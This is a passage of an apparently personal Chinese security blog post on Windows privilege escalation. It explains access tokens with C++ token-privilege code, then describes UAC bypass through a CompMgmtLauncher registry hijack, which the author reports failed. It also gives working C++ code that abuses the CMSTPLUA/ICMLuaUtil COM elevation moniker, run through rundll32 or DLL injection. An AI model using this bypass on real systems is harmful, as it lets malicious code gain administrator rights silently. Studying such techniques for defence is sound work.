@@ -1,0 +1,545 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第六章  提权技术进程访问令牌权限提升访问令牌访问令牌 是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统会通过将密码与存储在安全数据库中的信息进行比较来验证用户的密码。如果密码经过身份验证，系统会生成访问令牌，并且代表该用户执行的每个进程都拥有该令牌的一个副本。该令牌标识用户、用户所属组和用户的特权。 系统使用该令牌控制对可保护对象的访">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权技术">
+<meta property="og:url" content="http://example.com/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Demo_博客">
+<meta property="og:description" content="第六章  提权技术进程访问令牌权限提升访问令牌访问令牌 是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统会通过将密码与存储在安全数据库中的信息进行比较来验证用户的密码。如果密码经过身份验证，系统会生成访问令牌，并且代表该用户执行的每个进程都拥有该令牌的一个副本。该令牌标识用户、用户所属组和用户的特权。 系统使用该令牌控制对可保护对象的访">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150614658.png">
+<meta property="og:image" content="http://example.com/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150827532.png">
+<meta property="og:image" content="http://example.com/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107164830632.png">
+<meta property="article:published_time" content="2022-11-08T01:37:48.000Z">
+<meta property="article:modified_time" content="2022-11-08T01:40:03.950Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="C++编程">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150614658.png">
+  
+  
+  <title>提权技术 - Demo_博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://unpkg.com/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://unpkg.com/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Demo_博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/bbs/">
+                <i class="iconfont icon-notebook"></i>
+                留言板
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="提权技术">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-11-08 09:37" pubdate>
+        2022年11月8日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.2k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      52 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">提权技术</h1>
+            
+            <div class="markdown-body">
+              <h2 id="第六章-提权技术"><a href="#第六章-提权技术" class="headerlink" title="第六章  提权技术"></a>第六章  提权技术</h2><h3 id="进程访问令牌权限提升"><a href="#进程访问令牌权限提升" class="headerlink" title="进程访问令牌权限提升"></a>进程访问令牌权限提升</h3><h4 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h4><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens?redirectedfrom=MSDN"><strong>访问令牌</strong></a> 是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统会通过将密码与存储在安全数据库中的信息进行比较来验证用户的密码。如果密码经过身份验证，系统会生成访问令牌，并且代表该用户执行的每个进程都拥有该令牌的一个副本。该令牌标识用户、用户所属组和用户的特权。 系统使用该令牌控制对可保护对象的访问，并控制用户在本地计算机上执行各种系统相关操作的能力。有两种类型的访问令牌，主要令牌和模拟。</p>
+<p>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌标识用户。 访问令牌包含以下信息：</p>
+<ul>
+<li>用户帐户 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/security-identifiers">的安全标识符</a> (SID) </li>
+<li>用户所属组的 SID</li>
+<li>标识当前<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/l-gly"><em>登录会话</em></a>的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/l-gly"><em>登录 SID</em></a></li>
+<li>用户或用户组持有 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/privileges">的特权</a> 列表</li>
+<li>所有者 SID</li>
+<li>主组的 SID</li>
+<li>当用户创建安全对象时系统使用的默认 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists">DACL</a> ，而无需指定 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/s-gly"><em>安全描述符</em></a></li>
+<li>访问令牌的源</li>
+<li>令牌是 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/p-gly"><em>主要</em></a> 令牌还是 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation">模拟</a> 令牌</li>
+<li>限制 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens">SID 的</a>可选列表</li>
+<li>当前模拟级别</li>
+<li>其他统计信息</li>
+</ul>
+<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>要想提升访问令牌权限，首先就要获取进程的访问令牌，然后将访问令牌的权限修改为指定权限。但是系统内部并不直接识别权限名称<br>而是识别LUID值，所以需要根据权限名称获取对应的LUID值，之后传递给系统，实现进程访问令牌权限的修改。</p>
+<p>具体实现步骤如下所示：</p>
+<p><strong>首先</strong>,程序需要调用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken</a>函数打开指定的进程令牌，并获取TOKEN_ADJUST_PRIVILEGES权限的令牌句柄。之所以要指定进程令牌权限为TOKEN_ADJUST_PRIVILEGES，是因为<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">AdjustTokenPrivileges</a>函数要求有此权限，方可修改进程令牌的访问权限。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//打开进程令牌并获取具有TOKEN_ADJUST_PRIVILEGES权限的进程令牌句柄</span><br><span class="hljs-built_in">OpenProcessToken</span>(hProcess,TOKEN_ADJUST_PRIVILEGES,&amp;hToken)l;<br><span class="hljs-comment">//其中，第一个参数表示要打开的进程令牌的进程句柄;第二个参数表示程序对进程令牌具有的权限，TOKEN_ADJUST_PRIVILEGES表示具有修改进程令牌的权限;第三个参数表示返回的进程令牌句柄。</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>再接着</strong>调用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea">LookupPrivilegeValue</a>函数，获取本地系统指定特权名称的LUID值，这个LUID值相当于该特权的身份标识号。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取本地系统的pszPrivilegesName特权的LUID值</span><br><span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>,pszPrivilegesName,&amp;luidValue);<br><span class="hljs-comment">//其中，第一个参数表示系统，NULL表示本地系统;第二个参数表示特权名称;第三个参数表示获取到的LUID返回值。</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>接着</strong>，程序就开始对进程令牌特权结构体TOKEN_PRIVILEGES进行赋值，设置新特权的数量、特权对应的LUID值以及特权的属性状态。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//设置提升权限信息</span><br>tokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = luidValue;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-comment">//其中，PrivilegeCount表示设置新特权的数量;Privileges[0].Luid表示第一个特权对应的LUID值;Privileges[0].Attributes表示第一个特权的属性，SE_PRIVILEGE_ENABLED表示启动该特权。</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>最后</strong>，程序调用AdjustTokenPrivileges函数对进程令牌的特权进行修改，将上面设置好的新特权设置到进程令牌中，这样就完成了进程访问令牌的修改工作。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//修改进程令牌访问权限</span><br><span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken,FALSE,&amp;tokenPrivileges,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//其中，第一个参数表示进程令牌;第二个参数表示是否禁用所有令牌的权限，FALSE表示不禁用;第三个参数是新设置的特权,指向设置好的令牌特权结构体;第四个参数表示返回上一个特权数据缓冲区的大小，若不获取，则可以设为零;第五个参数表示返回上一个特权数据缓冲区，若不接收返回数据,可以设为NULL;第六个参数表示返回上一个特权数据缓冲区应该有的大小。</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">EnbalePrivileges</span><span class="hljs-params">(HANDLE hProcess, <span class="hljs-type">char</span>* pszPrivilegesName)</span></span><br><span class="hljs-function"></span>&#123;<br>	HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>	LUID luidValue = &#123; <span class="hljs-number">0</span> &#125;;<br>	TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="hljs-number">0</span> &#125;;<br>	BOOL bRet = FALSE;<br>	DWORD dwRet = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄</span><br>	bRet = <span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);<br>	<span class="hljs-keyword">if</span> (FALSE == bRet)<br>	&#123;<br>		<span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenProcessToken&quot;</span>);<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span><br>	bRet = <span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, pszPrivilegesName, &amp;luidValue);<br>	<span class="hljs-keyword">if</span> (FALSE == bRet)<br>	&#123;<br>		<span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;LookupPrivilegeValue&quot;</span>);<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-comment">// 设置提升权限信息</span><br>	tokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>	tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = luidValue;<br>	tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>	<span class="hljs-comment">// 提升进程令牌访问权限</span><br>	bRet = <span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivileges, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (FALSE == bRet)<br>	&#123;<br>		<span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;AdjustTokenPrivileges&quot;</span>);<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-comment">// 根据错误码判断是否特权都设置成功</span><br>		dwRet = ::<span class="hljs-built_in">GetLastError</span>();<br>		<span class="hljs-keyword">if</span> (ERROR_SUCCESS == dwRet)<br>		&#123;<br>			<span class="hljs-keyword">return</span> TRUE;<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet)<br>		&#123;<br>			<span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);<br>			<span class="hljs-keyword">return</span> FALSE;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><p>自从VISTA系统开始引人了UAC（用户账户控制），涉及权限操作时都会有弹窗提示，只有用户点击确认后，方可继续操作。所以，VISTA之后的提权操作主要是针对UAC不弹窗静默提权，即BypassUAC。</p>
+<p>触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo和RAiLuanchAdminProcess函数。该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认。这个UAC窗口会创建新的安全桌面，屏蔽之前的界面。同时这个UAC窗口进程时系统权限进程，其他普通进程无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员身份启动请求的进程。</p>
+<p>Bypass UAC提权技术主要利用<strong>白名单机制</strong>以及<strong>COM组件接口技术</strong>来实现。</p>
+<h4 id="基于白名单程序的Bypass-UAC"><a href="#基于白名单程序的Bypass-UAC" class="headerlink" title="基于白名单程序的Bypass UAC"></a>基于白名单程序的Bypass UAC</h4><p>有些系统程序是直接获取管理员权限，而不触发UAC弹框的，这类程序称为白名单程序。可以通过DLL劫持、注入或是修改注册表执行命令等方式，利用这些白名单程序启动目标程序，实现BypassUAC提权操作。</p>
+<p><strong>选取CompMgmtLauncher.exe进行详细分析。</strong></p>
+<p>分析发现，CompMgmtLauncher.exe进程会先查询注册表HKCU\Software\Classes\mscfile\shell\open\command中的数据，发现该路路径不存在后，继续查询注册表HKCR\mscfile\shell\open\command(Default)中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息。然后执行mmc.exe。</p>
+<p><img src="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150614658.png" srcset="/img/loading.gif" lazyload alt="image-20221107150614658"></p>
+<p>所以我们可以在HKCU\Software\Classes\mscfile\shell\open\command中写入数据。手动添加该注册表路径，并设置默认数据为C:\Windows\System32\cmd.exe，并运行CompMgmtLauncher.exe。</p>
+<p><img src="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150827532.png" srcset="/img/loading.gif" lazyload alt="image-20221107150827532"></p>
+<p><strong>结果cmd并未以管理员权限运行。</strong>推测是windows更新，对相关功能进行修改。</p>
+<h4 id="基于COM组件接口的Bypass-UAC"><a href="#基于COM组件接口的Bypass-UAC" class="headerlink" title="基于COM组件接口的Bypass UAC"></a>基于COM组件接口的Bypass UAC</h4><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/com/the-com-elevation-moniker">COM提升名字对象</a>（COM Elevation  Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以提升COM接口权限。</p>
+<p>同时，ICMLuaUtil接口提供了ShellExec方法来执行命令，创建指定进程。因此，我们可以利用COM提升名字对象来对ICMLuaUtil接口提权，之后通过接口调用ShellExec方法来创建指定进程，实现Bypass UAC。</p>
+<p><strong>实现过程</strong></p>
+<p>使用权限提升COM类的程序必须通过调用CoCreatelnstanceAsAdmin函数来创建COM类，下面给出的是函数的改进代码，它增加了初始化COM环境的代码。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HRESULT <span class="hljs-title">CoCreateInstanceAsAdmin</span><span class="hljs-params">(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)</span></span><br><span class="hljs-function"></span>&#123;<br>	BIND_OPTS3 bo;<br>	WCHAR wszCLSID[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>	WCHAR wszMonikerName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>	HRESULT hr = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">// 增加初始化COM环境</span><br>	::<span class="hljs-built_in">CoInitialize</span>(<span class="hljs-literal">NULL</span>);<br>	<span class="hljs-comment">// 构造字符串</span><br>	::<span class="hljs-built_in">StringFromGUID2</span>(rclsid, wszCLSID, (<span class="hljs-built_in">sizeof</span>(wszCLSID) / <span class="hljs-built_in">sizeof</span>(wszCLSID[<span class="hljs-number">0</span>])));<br>	hr = ::<span class="hljs-built_in">StringCchPrintfW</span>(wszMonikerName, (<span class="hljs-built_in">sizeof</span>(wszMonikerName) / <span class="hljs-built_in">sizeof</span>(wszMonikerName[<span class="hljs-number">0</span>])), <span class="hljs-string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>	&#123;<br>		<span class="hljs-keyword">return</span> hr;<br>	&#125;<br>	<span class="hljs-comment">// 设置BIND_OPTS3</span><br>	::<span class="hljs-built_in">RtlZeroMemory</span>(&amp;bo, <span class="hljs-built_in">sizeof</span>(bo));<br>	bo.cbStruct = <span class="hljs-built_in">sizeof</span>(bo);<br>	bo.hwnd = hWnd;<br>	bo.dwClassContext = CLSCTX_LOCAL_SERVER;<br>	<span class="hljs-comment">// 创建名称对象并获取COM对象</span><br>	hr = ::<span class="hljs-built_in">CoGetObject</span>(wszMonikerName, &amp;bo, riid, ppVoid);<br>	<span class="hljs-keyword">return</span> hr;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过上述方法创建并激活提升权限的COM类创建后，直接调用ICMLuaUtil接口的ShellExec方法来创建指定进程，完成BypassUAC操作。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CMLuaUtilBypassUAC</span><span class="hljs-params">(LPWSTR lpwszExecutable)</span></span><br><span class="hljs-function"></span>&#123;<br>	HRESULT hr = <span class="hljs-number">0</span>;<br>	CLSID clsidICMLuaUtil = &#123; <span class="hljs-number">0</span> &#125;;<br>	IID iidICMLuaUtil = &#123; <span class="hljs-number">0</span> &#125;;<br>	ICMLuaUtil *CMLuaUtil = <span class="hljs-literal">NULL</span>;<br>	BOOL bRet = FALSE;<br>	<span class="hljs-keyword">do</span> &#123;<br>		::<span class="hljs-built_in">CLSIDFromString</span>(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);<br>		::<span class="hljs-built_in">IIDFromString</span>(IID_ICMLuaUtil, &amp;iidICMLuaUtil);<br>		<span class="hljs-comment">// 提权</span><br>		hr = <span class="hljs-built_in">CoCreateInstanceAsAdmin</span>(<span class="hljs-literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>		&#123;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">// 启动程序</span><br>		hr = CMLuaUtil-&gt;lpVtbl-&gt;<span class="hljs-built_in">ShellExec</span>(CMLuaUtil, lpwszExecutable, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, SW_SHOW);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>		&#123;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		bRet = TRUE;<br>	&#125;<span class="hljs-keyword">while</span>(FALSE);<br>	<span class="hljs-comment">// 释放</span><br>	<span class="hljs-keyword">if</span> (CMLuaUtil) <br>	&#123;<br>		CMLuaUtil-&gt;lpVtbl-&gt;<span class="hljs-built_in">Release</span>(CMLuaUtil);<br>	&#125;<br>	<span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果执行COM提升名称代码的程序身份是不可信的，还是会触发UAC弹窗；若是可信程序，则不会触发UAC弹窗。因此，必须使这段代码在WIndows可信程序中运行。可信程序有计算器、记事本、资源管理器、rundll32.exe等。可以通过DLL注入或是劫持技术，将这段代码注入到这些可信程序的进程空间当中。最简单的莫过于直接通过rundll32.exe来加载DLL，执行COM提升名称的代码。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 导出函数给rundll32.exe调用执行</span><br><span class="hljs-function"><span class="hljs-type">void</span> CALLBACK <span class="hljs-title">BypassUAC</span><span class="hljs-params">(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span class="hljs-type">int</span> iCmdShow)</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>测试</strong></p>
